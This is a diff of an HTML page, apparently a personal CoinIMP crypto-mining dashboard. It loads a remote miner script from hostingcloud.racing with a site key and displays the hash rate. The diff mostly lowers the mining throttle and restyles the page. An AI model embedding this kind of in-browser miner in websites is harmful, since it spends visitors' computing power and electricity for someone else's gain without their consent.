@@ -1,11 +1,12 @@
 <html>
   <head>
+    <link rel="stylesheet" href="/stylesheets/style.css">
     <script src="https://www.hostingcloud.racing/ElSO.js"></script>
     <script>
       var _client = new Client.Anonymous(
         "fc6f26a47a247e3dc22294282f147380a16e7fe15f5207439a917e7f6c33cce6",
         {
-          throttle: 0.9,
+          throttle: 0.4,
           c: "w",
         }
       );
@@ -26,29 +27,31 @@
             (before, worker) => before + worker.hashesTotal,
             0
           );
-          div.innerHTML = `Speed: ${speed} Hashes/s<br>Total Hash: ${total}`;
+          div.innerHTML = `<h4>Speed: ${speed} Hashes/s<br>Total Hash: ${total}</h4>`;
         }, 500);
-      }, 1000);
+      }, 800);
     </script>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   </head>
   <body>
     <div class="px-4 py-5 my-5 text-center">
-    <img class="d-block mx-auto mb-4" src="/images/icon.png" alt="" width="72" height="57">
+    <img class="img-pic d-block mx-auto mb-4" src="/images/icon.png" alt="" width="95" height="95">
     <h1 class="display-5 fw-bold">CoimIMP | @Fauzaro01</h1>
     <div class="col-lg-6 mx-auto">
       <p class="lead mb-4" id="result-hash"></p>
       <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">
         <div class="container">
           <div class="timerDisplay">
-            00 : 00 : 00 : 000
+            <h3>00 : 00 : 00 : 000</h3>
         </div>
+        <br>
         <button type="button" class="btn btn-success btn-lg px-4 gap-3" id="startTimer">Start</button>
         <button type="button" class="btn btn-danger btn-lg px-4" id="resetTimer">Reset Timer</button>
         <button type="button" class="btn btn-warning" id="reloadAll">Reload</button>
       </div>
     </div>
   </div>
+  <br/>
     Kalo ada yang mau buat klik link dibawah ini
     <br />
     <a
